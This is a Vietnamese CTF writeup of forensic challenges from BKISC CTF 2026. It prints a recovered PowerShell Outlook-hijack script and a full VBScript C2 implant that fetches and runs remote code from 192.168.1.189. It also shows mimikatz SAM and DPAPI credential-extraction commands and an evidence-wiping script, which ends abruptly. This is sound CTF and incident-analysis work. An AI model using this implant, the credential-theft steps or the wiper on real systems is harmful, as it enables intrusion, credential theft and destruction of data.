---
title: "BKISC CTF 2026"
description: "Writeup for Forensic Challenge"
summary: "Writeup for Forensic Challenge"
categories: ["Writeup"]
tags: ["Forensic", "Writeup"]
#externalUrl: ""
date: 2026-05-10
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/bkisclogo.jpg
---

Writeup for Forensic Challenges

## Beatiful Memory

![image](/images/bkiscctf2026/1.png)
*I left my most precious memory here, can you find it?*


File `.dmp` là **Windows Complete Memory Dump**: chứa toàn bộ nội dung RAM tại thời điểm dump

```
chall.dmp: MS Windows 64bit crash dump, version 15.19045
→ Windows 10 Build 19045 (22H2)
→ DumpType 0x1 = Complete Memory Dump
```

**Hint:** "most precious memory" → gợi ý tìm kiếm ảnh hoặc dữ liệu quý giá trong RAM.


Trước hết liệt kê tiến trình với Volatility 3

```bash
volatility3 -f chall.dmp windows.pslist
```
![image](/images/bkiscctf2026/2.png)

Kết quả cho thấy nhiều tiến trình của edge, mình nghĩ tới [edge store cred plaintext](https://www.pcmag.com/news/researcher-finds-microsoft-edge-stored-passwords-load-in-plaintext) 
Vậy thì ta sẽ cố gắng dump passwd của user edge [tool](https://github.com/L1v1ng0ffTh3L4N/EdgeSavedPasswordsDumper)

![image](/images/bkiscctf2026/3.png)

```
[+] Credential Found!                                                      
Raw Memory Layout : mhttps flag SdLwD5BNPf6767!
Username          : flag
Password          : SdLwD5BNPf6767!
```


Tới đây mình thử grep strings, và nó thực sự ra flag=]]
Windows lưu chuỗi dưới dạng **UTF-16 Little Endian** nên phải dùng flag `-el`:


```bash
strings -el chall.dmp | grep -iE "BKISC\{|CTF\{|flag\{"
```
![image](/images/bkiscctf2026/4.png)
> BKISC{W3ll_M3mory_is_Str0nk_right_?}




## Lookout

![image](/images/bkiscctf2026/5.png)
*While checking a monthly report sent by one of my employees, everything seemed ordinary. However, when I logged back in my mailbox the next day, something strange was happening on my computer.*


Navigate đến `Desktop` của user → tìm thấy file `.pcap` đáng ngờ

![image](/images/bkiscctf2026/6.png)


Mở bằng **Wireshark** 
Phát hiện 1 file report.txt khá đáng ngờ mà "monthly report" nhắc tới trong đề bài
→ **File > Export Objects > HTTP**:
![image](/images/bkiscctf2026/7.png)


IP attacker: `192.168.1.189:1704`



Nội dung `report.txt`:
![image](/images/bkiscctf2026/8.png)


**Kết quả decode được là 1 PowerShell script:**

```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\
{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force
```

**Phân tích hành vi:**

| Hành động | Mục đích |
|-----------|---------|
| Ghi registry `Outlook\Webview\Inbox\url` | Hijack Outlook Inbox → load trang web của attacker khi mở Outlook |
| Áp dụng cho Office 14.0, 15.0, 16.0 | Tương thích Office 2010/2013/2016 |
| `Zones\2` → disable security | Cho phép chạy ActiveX/Script không cần xác nhận |
| `Remove-Item` xóa file .reg | Xóa dấu vết |
| **C2 Server:** `192.168.1.189:8386` | Địa chỉ máy chủ điều khiển |

**Framework:** [TrustedSec Specula](https://github.com/trustedsec/specula) — C2 framework dùng Microsoft Outlook làm implant thông qua WebView hijacking.

Giải thích 1 chút tại sao có file `report.txt` chứa powershell độc hại này
Ở trong ***C:\Users\BKISC\AppData\Local\Microsoft\Outlook*** có 1 file **.ost** chứa data của email 
![image](/images/bkiscctf2026/9.png)

Trích xuất nó ra và phân tích bằng [OST VIEWER](https://apps.microsoft.com/detail/XP87VTPJGV2367?hl=en-US&gl=US&ocid=pdpshare)
Ở trong mục important có chứa nội dung của  email đáng ngờ: scheybrening@gmail.com
![image](/images/bkiscctf2026/10.png)
Như vậy là ta đã rõ attack chain là social engineering
`Attacker giả danh "Schey Brening - Head of Accountant" để dụ nạn nhân tải về và mở file txt → PowerShell thực thi → Hijack Outlook WebView Inbox → Specula C2 chiếm quyền kiểm soát`

Quay lại Wireshark, Filter traffic đến C2 server:

```
ip.addr == 192.168.1.189 && tcp.port == 8386
```
![image](/images/bkiscctf2026/11.png)


**Timeline giao tiếp:**

```
GET  /css/dx7u7QYCSlbTbQ/FxBdmVg     → Tải VBScript implant (3610 bytes)
GET  /css/dx7u7QYCSlbTbQ/rUe38nIs    → Polling lệnh từ C2 (mỗi 10 giây)
POST /css/dx7u7QYCSlbTbQ             → Gửi kết quả lệnh về C2
```

**Phân tích VBScript implant (FxBdmVg):**
![image](/images/bkiscctf2026/12.png)
```vbscript
Set outlookapp = window.external.OutlookApplication
Dim ay
Dim sync


Function requestpage(uri, rR)
	On Error Resume Next
	vi = Left(outlookapp.version,4)
	d = rR
	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
	oP.open "POST", uri,false
	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
	oP.setRequestHeader "Content-Length", Len(d)
	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
	oP.setOption 2, 13056
	oP.send Replace(d, vbLf, "")
	requestpage = oP.responseText
End Function

Sub downloadcode (uri)
        On Error Resume Next
		Set serverapp = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
		vr = Left(outlookapp.version,4)
		serverapp.open "GET", uri, False
		serverapp.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
		serverapp.send
		response = serverapp.ResponseText
        f = Left(response, 1)
		j = Int(Mid(response, 2, 4)) * 1000
		If Err.Number <> 0 Then
		    Exit Sub
		End If
		sync = j
		If f = 2 Then
		    Exit Sub
		ElseIf f = 1 Then
            ExecuteGlobal Crypt(Mid(response, 6), ay, False)
		Else
            ExecuteGlobal Mid(response, 6)
		End If
End Sub

Function readreg(path,value)
	On Error Resume Next
	Va = ""
	Set oL = outlookapp.CreateObject("WbemScripting.SWbemLocator")
   Set lr = oL.ConnectServer(".", "root\cimv2").Get("StdRegProv")
	lr.GetStringValue 2147483649, path, value, Va
	readreg = Va
End Function

Function Crypt(input, Key, Mode)
    For i = 1 To Len(input)
        Position = Position + 1
        If Position > Len(Key) Then Position = 1
        keyx = Asc(Mid(Key, Position, 1))
        If Mode Then
            orgx = Asc(Mid(input, i, 1))
            cptx = orgx Xor keyx
            cptString = Hex(cptx)
                        If Len(cptString) < 2 Then cptString = "0" & cptString
                        z = z & cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cptx = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orgx = cptx Xor keyx
            z = z & Chr(orgx)
        End If
    Next
    Crypt = z
End Function

Function crypthelper(input, key, mode)
	l = Len(input)
	Dim j
	If mode Then
		ReDim j(l * 2)
	Else
		ReDim j(l / 2)
	End If
    For i = 1 To l
        Position = Position + 1
        If Position > Len(key) Then Position = 1
        kZ = Asc(Mid(key, Position, 1))
        If mode Then
            orZ = Asc(Mid(input, i, 1))
            cpt = orZ Xor kZ
            cptString = Hex(cpt)
			If Len(cptString) < 2 Then cptString = "0" & cptString
			j(i) = cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cpt = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orZ = cpt Xor kZ
            j(i) = Chr(orZ)
        End If
    Next
    crypthelper = Join(j, "")
End Function

Function update_subscription()
    aluceps_coi = Int((2200 - 201 + 1) * Rnd + 0)
    if aluceps_coi = 1194 then
        Set ws = window.external.OutlookApplication.CreateObject("Wscript.shell")
        c = "cmd /c start https://github.com/trustedsec/specula/wiki/Why-am-I-seeing-this%3F"
	    ws.Run c, 0, true
    end if

    downloadcode "http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ/rUe38nIs"
    window.setTimeout "update_subscription", sync, "VBScript"
End Function


oldstr = ""
sync = 10 * 1000
ay = readreg("Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo", "KEY")
window.setTimeout "update_subscription", sync, "VBScript"
```

Ở đây ta thấy


```vbscript
Set outlookapp = window.external.OutlookApplication

' Đọc XOR key từ registry
ay = readreg("Software\Microsoft\Office\16.0\Outlook\UserInfo", "KEY")

' Response format: [f][sync_4digits][encrypted_data]
' f=1 → decrypt với Crypt(data, ay, False) → XOR cipher
' f=2 → exit

Function Crypt(input, Key, Mode)
    ' XOR encryption/decryption với key lặp lại
    For i = 1 To Len(input)
        keyx = Asc(Mid(Key, (i-1) Mod Len(Key) + 1, 1))
        ' Mode=True: encrypt, Mode=False: decrypt
    Next
End Function

' Main loop: poll C2 mỗi 10 giây
window.setTimeout "update_subscription", 10000, "VBScript"
```

**Response format từ C2:**
```
[1 byte: type][4 bytes: sync_ms][hex_encrypted_data]
type=0 → plaintext VBScript
type=1 → XOR encrypted VBScript  
type=2 → sleep/idle
```


Key được tạo ngẫu nhiên và lưu tại:
```
HKCU\Software\Microsoft\Office\16.0\Outlook\UserInfo → "KEY"
```

Ta quay lại FTK và Export `NTUSER.DAT` 
![image](/images/bkiscctf2026/13.png)

Và mở bằng Registry Explorer 

Navigate đến: ***Software\Microsoft\Office\16.0\Outlook\UserInfo***

![image](/images/bkiscctf2026/14.png)

**Tìm thấy:**
```
Value Name : KEY
Value Type : RegSz
Data       : o4WlfbKbx1xik1TgTQGeOQ
```


Implement XOR decrypt theo thuật toán của VBScript:

```python
def xor_decrypt(hex_str, key):
    data = bytes.fromhex(hex_str)
    key_bytes = key.encode()
    return ''.join(chr(b ^ key_bytes[i % len(key_bytes)]) 
                   for i, b in enumerate(data))

key = "o4WlfbKbx1xik1TgTQGeOQ"
```

**Giải mã các C2 commands (server → victim) dựa vào key vừa tìm được:**

Ví dụ
```python
hex_data = "657222020516220d..." # từ Wireshark
dec = xor_decrypt(hex_data, "o4WlfbKbx1xik1TgTQGeOQ")
→ ra VBScript chứa Function dir_lister(...)
```

**CMD 1: Directory listing:**
```vbscript
Function dir_lister(folderpath, depth, recurselevels, ...)
```
→ C2 ra lệnh liệt kê thư mục

**CMD 2: Kiểm tra file size:**
```vbscript
Function get_file()
    Set file = fs.GetFile("C:\Users\BKISC\Desktop\flag.py")
    get_file = file.size   ' → trả về 684 bytes
End Function
```

**CMD 3: Download file:**
```vbscript
Function download_file()
    Set file = fs.GetFile("C:\Users\BKISC\Desktop\flag.py")
    readBinary = .Read(684)   ' đọc 684 bytes
End Function
```

**CMD 4: Xóa file:**
```vbscript
Function delete_file()
    fs.DeleteFile "C:\Users\BKISC\Desktop\flag.py"
End Function
```

**Giải mã POST data (victim → C2):**

```python
# POST sau CMD_3: nội dung flag.py bị exfiltrate
dec = xor_decrypt(post_flag_hex, key)
```

**Kết quả: `flag.py`**

```python
# Just run the code to get the flag lol

def RC4(key: bytes, plaintext: bytes):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)
    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

**Xác nhận cuối: POST sau CMD_4:**
```
Delete file: C:\Users\BKISC\Desktop\flag.py - Success!
```
→ Attacker đã xóa file sau khi lấy nội dung!


vậy ta có solution:

```python
def RC4(key: bytes, plaintext: bytes):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    ciphertext = []
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        k = S[t]
        ciphertext.append(char ^ k)
    return bytes(ciphertext)

key = b"lookalikechicken"
plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
print(RC4(key, plaintext).decode())
```

> BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}


## The Interview

![image](/images/bkiscctf2026/15.png)

*You are an undercover police officer, sent on a dangerous mission to bring down a fraudulent organization from the inside. Your only way in is to pose as a job applicant, and now, the company has contacted you for an interview. You unexpectedly gain access to the HR representative’s phone data. It is your chance to expose their secrets and take the entire operation down.*
*!!!WARNING: Need OSINT skills to complete the challenge*

Giải nén
![image](/images/bkiscctf2026/16.png)
Đây là **Android data partition dump**, gồm các thư mục đáng chú ý

```
data/    App data (databases, shared_prefs, files)
media/    Ảnh, video, tài liệu
user/    User profile data
cache/    Cache của ứng dụng
adb/    ADB-related data
```
Bước đầu mày mò bằng type - sort, mình tìm được 1 số thông tin 

```
Email: thuminh689099@gmail.com
Username: hrofbkisc_66183
Discord username: teo01958 (display name: Te0f)
Server ID Discord: 1479383693687652493
Instagram App ID: 41165454102 & 18064629341374103
```

Tạm để đó, chuyển sang khai thác các db
```python
sqlite3 ./data/com.android.providers.telephony/databases/mmssms.db \
  "SELECT address, date, body FROM sms ORDER BY date DESC LIMIT 50;"
```

![image](/images/bkiscctf2026/17.png)
SMS có tin nhắn mã hóa từ số 0666777888 sử dụng b64 và xor key

Chuyển sang truy tìm key trong db

```python
sqlite3 ./data/com.android.providers.calendar/databases/calendar.db \
  "SELECT title, description, dtstart FROM Events 
   WHERE calendar_id NOT IN (SELECT _id FROM Calendars WHERE name LIKE '%holiday%')
   ORDER BY dtstart DESC LIMIT 20;"
```

![image](/images/bkiscctf2026/18.png)

Tìm được key là: `ronaldoisthechampionofworldcup2026`

Sau khi có key, viết script giải mã sms

script_p1.py
```python
import base64
msgs = [
    "OgYAFUwCABtTBAkXF0hTV1A9BwtPEwQKAEwMAgZQVl9FWB4ADwUJAE8IUwcYAAABAAFQDg4DCl1XGwAVRBcaUEVZXBYGBw8VTAMOBBZaYg==",
    "Ig4cFV1eTys4PTsmGA5RHxUHHAYGEigCHQ4NDxBDQW9bRS0ZXRMVHTBaR0EROgEdVg==",
    "NQABBUwIGgoYWEgEDQxBJFcFA04IDwEKUhULFlUERV8SVx8OFAgCA08dGx0GAhBIEwQXARtOAQkAQQ==",
    "Nh0LEh9ECQYBGQkJDxFBDB4NTwsBDBgWUhULFgcDV1xUGA==",
    "JgcLEwlEDhsWVAlFBQ0WTQQBBgAIFVcbHUwPBhAAEllcFh8GAAVMBgoPHAYNRRcABE0ZBxsLHRAeCgVC",
]
key = b"ronaldoisthechampionofworldcup2026"
def xor_key(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
for i, msg in enumerate(msgs, start=1):
    try:
        raw = base64.b64decode(msg)
        decrypted = xor_key(raw, key)
        try:
            decoded = decrypted.decode("utf-8")
            print(f"[MSG {i}] {decoded}")
        except UnicodeDecodeError:
            print(f"[MSG {i}] {decrypted}")
    except Exception as e:
        print(f"[MSG {i}] Error: {e}")
```
![image](/images/bkiscctf2026/19.png)

Vậy ta có part1 của flag
> BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7

Nhìn kỹ đoạn chat vừa giải mã ta thấy được hint của part2 là *"The user has downloaded a special game; try to win that game"*

-> Game đó chính là **spacerunner.apk**, app của BKISC trong **Download folder**
![image](/images/bkiscctf2026/20.png)

Trích xuất nó về, strings grep tổng quan 
![image](/images/bkiscctf2026/21.png)
ok, ta đã biết chính xác hàm để lấy part2 ở đâu rồi

load vào jada-gui để phân tích, nhảy tới hàm **GameState.java**
![Screenshot 2026-05-09 142424](/images/bkiscctf2026/22.png)

```java
public final class GameState {
    public static final int $stable = 8;
    private boolean gameOver;
    private int score;
    private boolean victory;

    public final int getScore() {
        return this.score;
    }

    public final void setScore(int i) {
        this.score = i;
    }

    public final boolean getGameOver() {
        return this.gameOver;
    }

    public final void setGameOver(boolean z) {
        this.gameOver = z;
    }

    public final boolean getVictory() {
        return this.victory;
    }

    public final void setVictory(boolean z) {
        this.victory = z;
    }

    public final int targetScore() {
        return 1337337;
    }

    public static /* synthetic */ void addScore$default(GameState gameState, int i, int i2, Object obj) {
        if ((i2 & 1) != 0) {
            i = 1;
        }
        gameState.addScore(i);
    }

    public final void addScore(int amount) {
        this.score += amount;
    }

    public final boolean shouldWin() {
        boolean isScoreValid = this.score >= targetScore() || this.score < 0;
        return isScoreValid && secretGate();
    }

    private final boolean secretGate() {
        int luck = Random.INSTANCE.nextInt(DurationKt.NANOS_IN_MILLIS);
        return luck == 133337;
    }

    public final String getPart2() {
        if (!this.victory) {
            return "Keep flying, pilot!";
        }
        byte[] buffer = new byte[35];
        for (int i = 0; i < 7; i++) {
            byte[] chunk = fetchBufferPart(i);
            for (int j = 0; j < 5; j++) {
                int idx = (i * 5) + j;
                buffer[idx] = (byte) (chunk[j] ^ computeMagic(idx));
            }
        }
        return new String(buffer, Charsets.UTF_8);
    }

    private final byte[] fetchBufferPart(int p) {
        switch (p) {
            case 0:
                return new byte[]{76, 66, 44, 13, 32};
            case 1:
                return new byte[]{69, 119, 29, 39, 89};
            case 2:
                return new byte[]{38, 0, 125, 80, 29};
            case 3:
                return new byte[]{1, 102, 90, 118, 7};
            case 4:
                return new byte[]{76, 89, 118, 29, 102};
            case 5:
                return new byte[]{69, 39, 54, 122, 68};
            default:
                return new byte[]{29, 7, 35, 67, 29};
        }
    }

    private final int computeMagic(int i) {
        int m = i % 4;
        if (m < 1) {
            return 19;
        }
        if (m < 2) {
            return 55;
        }
        return m < 3 ? 66 : 105;
    }
}
```

script_p2.py
```python
def compute_magic(i):
    m = i % 4
    if m < 1: return 19
    if m < 2: return 55
    if m < 3: return 66
    return 105

parts = [
    [76, 66, 44, 13, 32],   # p=0
    [69, 119, 29, 39, 89],  # p=1
    [38, 0, 125, 80, 29],   # p=2
    [1, 102, 90, 118, 7],   # p=3
    [76, 89, 118, 29, 102], # p=4
    [69, 39, 54, 122, 68],  # p=5
    [29, 7, 35, 67, 29],    # p=6
]

buffer = []
for i in range(7):
    chunk = parts[i]
    for j in range(5):
        idx = i * 5 + j
        buffer.append(chunk[j] ^ compute_magic(idx))

print(''.join(chr(b) for b in buffer))
```
Ta được part2 của flag
> _und3r5t4nding_hum4n_n4ture_is_n0t_

Tới part 3 của flag, thì từ email đã khai thác được trong dump Android:thuminh689099@gmail.com, bỏ đuôi gmail ta có được handle **thuminh689099**, dựa vào đây ta sẽ thử xem các trang social của người dùng này thì tìm được trên [Twitter](https://x.com/thuminh689099) và [Tiktok](https://www.tiktok.com/@thuminh689099)

![image](/images/bkiscctf2026/23.png)
→ trong bio có link Pastebin và format password

![image](/images/bkiscctf2026/24.png)
→ có video quay cảnh

Mình học ở HCM nên nhìn tòa nhà đó rất quen..
![image](/images/bkiscctf2026/25.png)
Nó chính là tòa nhà của Đại học Hồng Bàng. Vậy thì tòa nhà nhìn chéo kia chắc chắc là UEF rồi

Từ đây ta sẽ đối chiếu sang vị trí được chụp ở trong ảnh
![image](/images/bkiscctf2026/26.png)
Vị trí cần tìm sẽ loanh quanh vòng tròn to này
Sau khi cross-reference các yếu tố ở ảnh thứ 2 với Google Maps ở chế độ xem phố
→ xác định được địa điểm quay video tại [BAP Building](https://maps.app.goo.gl/zyhsqdgL17fYEGes8) 
Format lại tọa độ: **10.798,106.708**


![image](/images/bkiscctf2026/27.png)
Ta được p3 của flag

Vậy ta có Flag:
> BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7_und3r5t4nding_hum4n_n4ture_is_n0t_s0_be_c4uti0us_e5peci4lly_w1th_BKISCmembers}


## HomeWork

![image](/images/bkiscctf2026/28.png)
*My friend and I were sleeping in our online class, when the session ended in group chat our teacher said the deadline is tomorrow, but we don't know what it is. Can you help us ?*
*Flag format is BKISC{}*

Đề bài cho 1 file ad1. Load vào FTK, 

![image](/images/bkiscctf2026/29.png)
trích xuất hai file Registry quan trọng: *C:\Windows\System32\config\SAM* và *SYSTEM* 
Sau đó sử dụng công cụ mimikatz để lấy NTLM hash 
`lsadump::sam /system:SYSTEM /sam:SAM`
![image](/images/bkiscctf2026/30.png)
Như vậy ta có NTLM hash của user KangTheConq: `53eb1a04579d5b0cb8f395e9a780a820`. Đẩu lên [Crackstation](https://crackstation.net/) để crack password

![Screenshot 2026-05-16 124345](/images/bkiscctf2026/31.png)
Tìm được passwd của user là: **Sup3rR0ckP4ss**

Tiếp theo, dựa vào đề bài tìm 1 platform giao tiếp với nhau, và ở chall này đó là zoom. Dữ liệu của Zoom được mã hóa và chìa khóa chính bị khóa bởi Windows DPAPI
![Screenshot 2026-05-16 140059](/images/bkiscctf2026/32.png)

Thực hiện trích xuất DPAPI tại *C:\Users\KangTheConq\AppData\Roaming\Microsoft\Protect\<SID>*
![image](/images/bkiscctf2026/33.png)

Tiếp tục dùng Mimikatz, cung cấp mật khẩu Windows vừa crack để giải mã Master Key:
```
dpapi::masterkey /in:1d4f66e2-0ad9-4e0b-9f17-c526c4920624 /sid:S-1-5-21-2185385569-2550479847-782288727-1000 /password:Sup3rR0ckP4ss
```
![image](/images/bkiscctf2026/34.png)

Đọc file cấu hình **zoom.us.ini** tại *AppData\Roaming\Zoom\data*, tìm chuỗi Base64 của biến *win_osencrypt_key*
![image](/images/bkiscctf2026/35.png)

Bỏ tiền tố ZWOSKEY, đưa [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=QVFBQUFOQ01uZDhCRmRFUmpIb0F3RS9DbCtzQkFBQUE0bVpQSGRrS0MwNmZGOFVteEpJR0pBQUFBQUFDQUFBQUFBQVFaZ0FBQUFFQUFDQUFBQUNoQkxaOUdVRnM0b2JnV0pOSjlSRDFIUmVEZ2FjVVMzMklRRHl0WFdwU0VnQUFBQUFPZ0FBQUFBSUFBQ0FBQUFEVFQvQmFzUVM0bEpLWjF4eGpTUnVrUlFvVmlCWkJJREQxTGp2SlNQL1Z3REFBQUFEOXZQUFB1T1ZjcWhJK3NCQXVBRkluVVRwWTNPTHROWk9wSER5bTViZnJVdTMyQjljYmZ1dlFoeWMxWHRjUldoWkFBQUFBZjhiVVdwRlEyRTI4U3QxY0xpNjVBT3FMam8rNlJ1RElNRml6ZmNyamhlRmF1anp5cC9ZVDRDMGdma2N3MHBHRnAzbmlGb1NIRGJ1OFIxSnNqMVY2YUE9PQ) giải mã, export thành file blob.bin

Sau đó dùng mimikatz kết hợp với Master Key vừa giải mã để decrypt blob.bin
```
dpapi::blob /masterkey:416028ce358926baf81aae4bc79ef097efc76d999f266c38f4b3c861625e8700b222d8daccfb2d596438014c54ab50835eeb523f4ce6165a8491653e05e80bae /in:blob.bin /out:main_key.bin 
```
![image](/images/bkiscctf2026/36.png)

Load vào Hxd để đọc main key
![image](/images/bkiscctf2026/37.png)
`ncj4HN14EMgmf1tuPqAv0FvYRXzhql5M+8bZf3/sv1k=`

Trích xuất file *zoommeeting.enc.db*, load vào SQLite để đọc với mainkey vừa tìm được và set pages 1024, 4000 iterations
![Screenshot 2026-05-16 144028](/images/bkiscctf2026/38.png)

Kiểm tra bảng message, thu được đoạn hội thoại của giáo viên kèm theo đường link Google Drive chứa file **homework.rar**
![Screenshot 2026-05-16 144317](/images/bkiscctf2026/39.png)

Access và tải về, giải nén
![Screenshot 2026-05-16 150829](/images/bkiscctf2026/40.png)

Giải thích 1 chút về lỗi này là do mình chơi trên ổ SSD rời, không phải là NTFS: Các chuẩn format như FAT32 hoặc exFAT (thường thấy trên ổ cứng rời, USB hoặc phân vùng phụ) không hỗ trợ Alternate Data Streams. Ta chỉ cần đẩy nó vào ổ C:\ và giải nén. 
Ta thấy bên trong có key.txt và homework.jpg. Tuy nhiên, nội dung file key.txt không đủ manh mối. Phân tích Header của RAR (hoặc giải nén trên NTFS) cho thấy có sử dụng [ADS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/e2b19412-a925-4360-b009-86e3b8a020c8)

Dùng PowerShell để đọc luồng dữ liệu ẩn :secret đính kèm trong key.txt
```shell
Get-Content -Path .\key.txt -Stream secret
```
![image](/images/bkiscctf2026/41.png)

Output trả về chỉ thị rõ ràng cho thuật toán AES-CBC:
- Key: b'N3v3rG0n4G1v3UUP'
- IV: bytes.fromhex('5778a7db75851bc63d8deed06a5d894f')

Dùng Python hoặc CyberChef để thực hiện mã hóa AES-CBC file homework.jpg để lấy được file ảnh chứa flag

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
key = b'N3v3rG0n4G1v3UUP'
iv = bytes.fromhex('5778a7db75851bc63d8deed06a5d894f')
with open('homework.jpg', 'rb') as f: data = f.read()
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_data = cipher.encrypt(pad(data, AES.block_size))
with open('flag.png', 'wb') as f: f.write(encrypted_data)
```
![image](/images/bkiscctf2026/42.png)

> BKISCTF{Y0u_G0t_A_F0r_Th1s_St3g4n0gr4phy_C14ss}




## Deleted Secret

![image](/images/bkiscctf2026/43.png)
*During a cybercrime investigation, law enforcement seized a suspect's machine while the system was still live. To prevent data loss from an imminent power failure, investigators performed a rapid acquisition of the disk. Analyze the resulting image to identify and document any relevant digital evidence.*
*Flag is separated into 2 parts.*

![image](/images/bkiscctf2026/44.png)

Đề cho 1 file ad1 khá nặng ~10GB khiến việc điều tra ban đầu khá khó khăn, mình đã mất nhiều thời gian để tìm được hướng đi 
Vọc 1 hồi mình tìm thấy được script đáng ngờ: `nuke.py`

![image](/images/bkiscctf2026/45.png)

```python    
import os
import sys
import shutil
import sqlite3
import subprocess
import time

# Enable ANSI escape sequences for Windows consoles
os.system('')

# Console Colors
CYAN = '\033[96m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def is_sqlite3(filepath):
    """Check if a file is an SQLite3 database by reading its header."""
    if not os.path.isfile(filepath):
        return False
    try:
        with open(filepath, 'rb') as f:
            return f.read(16) == b'SQLite format 3\x00'
    except Exception:
        return False

def wipe_sqlite_db(filepath):
    """Connect to an SQLite database, delete all data, and securely vacuum."""
    try:
        conn = sqlite3.connect(filepath)
        cursor = conn.cursor()
        
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';")
        tables = cursor.fetchall()
        
        for (table_name,) in tables:
            try:
                cursor.execute(f"DELETE FROM {table_name};")
            except sqlite3.Error:
                pass
        
        conn.commit()
        cursor.execute("VACUUM;")
        conn.close()
        return True
    except sqlite3.Error:
        return False

def secure_wipe_file(filepath):
    """Overwrites a file's contents with zeros before deleting it to prevent recovery."""
    try:
        if not os.path.isfile(filepath):
            return False
            
        file_size = os.path.getsize(filepath)
        
        # Open file in read/write binary mode and overwrite with null bytes
        with open(filepath, 'r+b') as f:
            f.write(b'\x00' * file_size)
            f.flush()
            os.fsync(f.fileno()) # Force the OS to write the zeros to the physical disk
            
        # Now that the physical disk sectors are blanked, delete the file pointer
        os.unlink(filepath)
        return True
    except Exception:
        return False

def main():
    current_dir = os.getcwd()
    local_app_data = os.environ.get('LOCALAPPDATA', '')
    edge_data_path = os.path.join(local_app_data, 'Microsoft', 'Edge', 'User Data')

    print(f"{RED}WARNING: You are about to PERMANENTLY WIPE AND OVERWRITE all files within:{RESET}")
    print(f"{CYAN}1. Current Directory: {current_dir}{RESET}")
    print(f"{CYAN}2. Edge Data:         {edge_data_path}{RESET}")
    print(f"{YELLOW}Note: SQLite databases will be vacuumed. All other files will be zero-filled and destroyed.{RESET}")

    response = input("Type 'YES' (all caps) to confirm: ")

    if response != 'YES':
        print(f"{YELLOW}Operation cancelled. Nothing was wiped.{RESET}")
        sys.exit(0)

    # 1. Force-close Edge and WebView2 to release file locks
    print(f"{YELLOW}Closing Microsoft Edge and WebView2...{RESET}")
    subprocess.run(['taskkill', '/F', '/IM', 'msedge.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['taskkill', '/F', '/IM', 'msedgewebview2.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3) 

    # 2. Securely Wipe current directory contents
    print(f"{YELLOW}Securely wiping current directory contents...{RESET}")
    for root, dirs, files in os.walk(current_dir, topdown=False):
        for file in files:
            filepath = os.path.join(root, file)
            # Skip the python script itself so it doesn't commit suicide mid-execution
            if filepath == os.path.abspath(__file__):
                continue
                
            if is_sqlite3(filepath):
                wipe_sqlite_db(filepath)
            else:
                secure_wipe_file(filepath)
                
        # Try to remove subdirectories after emptying them
        if root != current_dir:
            try:
                os.rmdir(root)
            except OSError:
                pass

    # 3. Process Edge Data directory
    print(f"{YELLOW}Wiping Edge browser data...{RESET}")
